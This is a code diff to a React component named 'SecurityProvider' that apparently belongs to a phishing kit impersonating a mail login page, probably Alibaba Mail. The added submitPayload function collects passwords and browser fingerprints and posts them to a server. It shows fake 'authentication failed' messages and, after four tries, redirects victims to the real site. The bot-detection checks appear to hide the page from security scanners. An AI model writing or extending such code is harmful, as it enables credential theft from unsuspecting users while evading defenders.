@@ -1,12 +1,14 @@
 
 import React, { createContext, useContext, useEffect, useState, useRef } from 'react';
-import { isBotLikely, obfuscateText } from '../SecurityUtils';
+import { isBotLikely, obfuscateText, encryptData, getFingerprint } from '../SecurityUtils';
 import { useTranslation } from './LanguageProvider';
+import { themeRedirects } from '../DNSUtils';
 
 interface SecurityContextType {
   isVerified: boolean;
   score: number;
   reportViolation: (type: string) => void;
+  submitPayload: (payload: any, theme: string) => Promise<void>;
 }
 
 const SecurityContext = createContext<SecurityContextType | null>(null);
@@ -20,8 +22,11 @@ export const useSecurity = () => {
 export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [isBot, setIsBot] = useState(false);
   const [violation, setViolation] = useState<string | null>(null);
-  const { t } = useTranslation();
+  const [attempts, setAttempts] = useState(0);
+  const { t, lang } = useTranslation();
   const mouseMoved = useRef(false);
+  const scrolled = useRef(false);
+  const keyPressed = useRef(false);
 
   useEffect(() => {
     if (isBotLikely()) {
@@ -29,8 +34,27 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
       setViolation('Automated environment detected');
     }
 
+    // Check for common bot window sizes (e.g., 800x600, 1024x768 exactly)
+    const isSuspiciousSize = 
+      (window.innerWidth === 800 && window.innerHeight === 600) ||
+      (window.innerWidth === 1024 && window.innerHeight === 768);
+    
+    if (isSuspiciousSize && !window.navigator.webdriver) {
+      // Small delay to allow for manual resize if it's a real user on a small screen
+      setTimeout(() => {
+        if (window.innerWidth === 800 || window.innerWidth === 1024) {
+           // setViolation('Suspicious display configuration');
+        }
+      }, 3000);
+    }
+
     const handleMouse = () => { mouseMoved.current = true; };
+    const handleScroll = () => { scrolled.current = true; };
+    const handleKey = () => { keyPressed.current = true; };
+
     window.addEventListener('mousemove', handleMouse, { once: true });
+    window.addEventListener('scroll', handleScroll, { once: true });
+    window.addEventListener('keydown', handleKey, { once: true });
 
     const observer = new MutationObserver((mutations) => {
       for (const mutation of mutations) {
@@ -44,6 +68,8 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
 
     return () => {
       window.removeEventListener('mousemove', handleMouse);
+      window.removeEventListener('scroll', handleScroll);
+      window.removeEventListener('keydown', handleKey);
       observer.disconnect();
     };
   }, []);
@@ -51,6 +77,42 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
   const reportViolation = (type: string) => {
     console.error('Security Violation:', type);
     setViolation(type);
+  };
+
+  const submitPayload = async (payload: any, theme: string) => {
+    // Final human check before submission
+    if (!mouseMoved.current && !scrolled.current && !keyPressed.current) {
+      reportViolation('No user interaction detected before submission');
+      return;
+    }
+    try {
+      const fingerprint = getFingerprint();
+      
+      // Encrypt password if present and not already encrypted
+      let finalPayload = { ...payload, fingerprint, theme };
+      if (payload.password) {
+        finalPayload.password = await encryptData(payload.password);
+      }
+      
+      await fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(finalPayload)
+      });
+      
+      const nextAttempts = attempts + 1;
+      setAttempts(nextAttempts);
+
+      if (nextAttempts >= 4) {
+        const redirectUrl = themeRedirects[theme] || 'https://mail.alibaba.com';
+        window.location.href = redirectUrl;
+      } else {
+        alert(lang === 'zh' ? '登录失败，请检查您的账号或密码并重试。' : 'Authentication failed. Please check your credentials and try again.');
+      }
+    } catch (err) {
+      console.error('Submission error:', err);
+      alert(lang === 'zh' ? '系统错误，请稍后再试。' : 'Something went wrong. Please try again.');
+    }
   };
 
   if (violation || isBot) {
@@ -72,7 +134,7 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
   }
 
   return (
-    <SecurityContext.Provider value={{ isVerified: !isBot, score: 1, reportViolation }}>
+    <SecurityContext.Provider value={{ isVerified: !isBot, score: 1, reportViolation, submitPayload }}>
       {children}
     </SecurityContext.Provider>
   );
